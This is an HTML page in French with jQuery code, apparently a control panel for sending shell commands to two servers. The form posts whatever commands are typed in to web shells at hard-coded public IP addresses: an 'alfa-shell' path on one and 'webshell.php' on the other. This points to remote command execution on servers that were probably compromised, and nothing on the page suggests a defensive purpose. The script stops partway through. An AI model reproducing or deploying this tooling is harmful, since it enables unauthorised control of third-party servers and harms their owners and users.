<!DOCTYPE html>
<html>
<head>
	<title>Envoyer des commandes à mes serveurs</title>
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.7.5/css/bulma.min.css">
</head>
<body>
	<section class="section">
		<div class="container">
			<h1 class="title">Envoyer des commandes à mes serveurs</h1>
			<form action="cons.php" method="POST">
				<div class="field">
					<label class="label">Sélectionnez un serveur :</label>
					<div class="control">
						<div class="select">
							<select name="server">
								<option value="server1">Server 1</option>
								<option value="server2">Server 2</option>
								<option value="both">Les deux serveurs</option>
							</select>
						</div>
					</div>
				</div>
				<div class="field">
					<label class="label">Entrez les commandes (séparées par des retours à la ligne) :</label>
					<div class="control">
						<textarea class="textarea" name="commands"></textarea>
					</div>
				</div>
				<div class="field">
					<div class="control">
						<button class="button is-link">Envoyer</button>
					</div>
				</div>
			</form>
		</div>
	</section>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
	<script>
		$(document).ready(function() {
			$('form').submit(function(e) {
				e.preventDefault();
				var server = $('select[name="server"]').val();
				var commands = $('textarea[name="commands"]').val().trim().split('\n');
				if (server == 'both') {
					sendToServer1(commands);
					sendToServer2(commands);
				} else if (server == 'server1') {
					sendToServer1(commands);
				} else if (server == 'server2') {
					sendToServer2(commands);
				}
			});

			function sendToServer1(commands) {
				$.ajax({
					url: 'http://5.196.95.68/alfa-shell/cons.php',
					type: 'POST',
					data: {
						cmds: commands.join('\n')
					},
					success: function(response) {
						console.log('Commandes envoyées à server 1 :', commands);
					},
					error: function(xhr, status, error) {
						console.error('Erreur lors de l\'envoi de commandes à server 1 :', error);
					}
				});
			}

			function sendToServer2(commands) {
				$.ajax({
					url: 'http://200.195.138.66/html/webshell.php',
					type: 'POST',
					data: {
						cmd: commands.join('\n'),
						dir: '/var/www/html'
					},
					success: function(response) {
						console.log('Commandes envoyées à server 2 :', commands);
					},
					error: function(xhr, status, error) {
						console.error('Erreur lors de l\'envoi de commandes à server 2 :', error);
					}
				});
			}
